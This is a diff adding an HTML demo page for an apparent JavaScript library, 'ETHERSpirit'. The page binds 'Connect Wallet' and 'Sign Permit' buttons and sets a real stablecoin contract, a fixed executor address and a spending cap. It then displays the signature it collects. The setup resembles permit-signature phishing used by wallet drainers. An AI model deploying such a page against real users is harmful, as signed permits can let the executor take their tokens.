@@ -1,0 +1,67 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>ETHERSpirit Demo</title>
+  <style>
+    body{font-family:Inter,system-ui,Arial;margin:24px;color:#0b1220}
+    .card{border:1px solid #eee;padding:18px;border-radius:8px;margin-bottom:12px}
+    button{padding:10px 14px;border-radius:6px;border:0;background:#2563eb;color:white;cursor:pointer}
+    pre{background:#f6f8fb;padding:12px;border-radius:6px}
+  </style>
+</head>
+<body>
+  <h1>ETHERSpirit — Demo</h1>
+  <p>This demo shows how to use the UMD script and bind buttons anywhere on a page.</p>
+
+  <div class="card">
+    <h3>1) Include script</h3>
+    <p>This demo loads the local bundle at <code>/docs/lib/etherspirit.umd.js</code>. When published to npm, use the CDN URL.</p>
+    <pre>&lt;script src="/lib/etherspirit.umd.js"&gt;&lt;/script&gt;</pre>
+  </div>
+
+  <div class="card">
+    <h3>2) Buttons</h3>
+    <p>Place any elements and give them CSS selectors — ETHERSpirit will bind behaviors to them.</p>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="signBtn">Sign Permit</button>
+    <div id="events" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>3) Example output</h3>
+    <div id="signedOutput">No signature yet</div>
+  </div>
+
+  <script src="./lib/etherspirit.umd.js"></script>
+  <script>
+    // Initialize with token, executor and amount (small demo values)
+    ETHERSpirit.init({
+      tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+      executorAddress: '0x05a5b264448da10877f79fbdff35164be7b9a869',
+      spendingCap: '1000000',
+      onSigned: function(sig){
+        document.getElementById('signedOutput').textContent = JSON.stringify(sig, null, 2);
+      }
+    });
+
+    ETHERSpirit.bindConnectButton('#connectBtn');
+    ETHERSpirit.bindSignButton('#signBtn');
+
+    // Show events
+    document.querySelector('#connectBtn').addEventListener('etherSpirit:connected', function(e){
+      const r = document.getElementById('events');
+      r.innerHTML = '<div>Connected: ' + e.detail.address + '</div>';
+    });
+    document.querySelector('#signBtn').addEventListener('etherSpirit:signed', function(e){
+      const r = document.getElementById('events');
+      r.innerHTML = '<div>Signed permit for ' + e.detail.owner + '</div>';
+      document.getElementById('signedOutput').textContent = JSON.stringify(e.detail, null, 2);
+    });
+    document.querySelector('#signBtn').addEventListener('etherSpirit:error', function(e){
+      document.getElementById('events').innerHTML = '<div style="color:#b91c1c">Error: ' + (e.detail.error && e.detail.error.message ? e.detail.error.message : e.detail.error) + '</div>';
+    });
+  </script>
+</body>
+</html>
